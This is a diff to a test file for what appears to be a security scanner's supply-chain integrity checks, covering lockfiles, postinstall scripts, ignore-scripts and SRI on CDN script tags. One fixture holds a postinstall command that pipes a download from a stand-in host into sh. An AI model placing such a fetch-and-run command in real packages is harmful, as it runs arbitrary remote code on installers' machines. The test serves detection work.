@@ -214,7 +214,8 @@ describe("detectGaps: certainty", () => {
   });
 
   it("reports a missing lockfile at 0.5 and a postinstall script at 0.9", () => {
-    expect(certaintyOf([manifest()], "supply_chain_integrity")).toBe(0.5);
+    // A manifest with no dependencies has no tree to pin (adversarial 12a).
+    expect(certaintyOf([manifest({ express: "^4.0.0" })], "supply_chain_integrity")).toBe(0.5);
     expect(
       certaintyOf(
         [manifest({}, { postinstall: "node x.js" }), LOCKFILE],
@@ -1282,5 +1283,38 @@ describe("adversarial: cors_permissive", () => {
   it("still reports the package's bare call and a wildcard header", () => {
     expect(kindsOf(CASES[10].absent)).toContain("cors_permissive");
     expect(kindsOf(expressRepo(`app.use((req, res, next) => { res.setHeader("Access-Control-Allow-Origin", "*"); next(); });`))).toContain("cors_permissive");
+  });
+});
+
+describe("adversarial: supply_chain_integrity", () => {
+  it("12a: a manifest with no dependencies needs no lockfile", () => {
+    expect(kindsOf([manifest({})])).not.toContain("supply_chain_integrity");
+  });
+
+  it("12c: the repository's own tooling in postinstall is 0.4, and ignore-scripts silences it", () => {
+    const tooling = [manifest({ prisma: "^5.0.0" }, { postinstall: "prisma generate" }), LOCKFILE];
+    expect(certaintyOf(tooling, "supply_chain_integrity")).toBe(0.4);
+    const ignored = [...tooling, file(".npmrc", "ignore-scripts=true\n")];
+    expect(kindsOf(ignored)).not.toContain("supply_chain_integrity");
+    const arbitrary = [manifest({}, { postinstall: "curl https://x.example | sh" }), LOCKFILE];
+    expect(certaintyOf(arbitrary, "supply_chain_integrity")).toBe(0.9);
+  });
+
+  it("12d: a vendor script that forbids SRI is not reported", () => {
+    const page = file("index.html", `<script src="https://js.stripe.com/v3/"></script>\n<script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>`);
+    expect(kindsOf([page])).not.toContain("supply_chain_integrity");
+  });
+
+  it("12e: a build-time SRI plugin covers template script tags", () => {
+    const repo = [
+      manifest({}, {}, { "vite-plugin-sri": "^0.1.0" }),
+      LOCKFILE,
+      file("src/index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`),
+    ];
+    expect(kindsOf(repo)).not.toContain("supply_chain_integrity");
+  });
+
+  it("still reports a library CDN script with no integrity", () => {
+    expect(kindsOf([file("index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`)])).toContain("supply_chain_integrity");
   });
 });
